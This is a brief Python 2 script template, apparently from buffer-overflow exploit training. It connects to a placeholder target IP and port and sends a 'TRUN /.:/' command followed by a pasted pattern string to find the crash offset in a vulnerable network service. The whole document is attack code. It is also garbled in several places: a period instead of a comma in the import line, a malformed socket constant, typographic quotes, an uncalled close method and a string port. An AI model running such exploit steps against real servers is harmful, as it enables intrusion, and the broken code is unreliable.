#!/usr/bin/python
import sys. socket

offset= “ {paste full chunk of characters here} ”

try:

    s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)
    s.connect((‘{target ip}’ , ‘{target port}’ ))

    s.send((‘ TRUN /.:/ ‘ + offset))
    s.close

except:
    print “Error connecting to server”
    sys.exit()
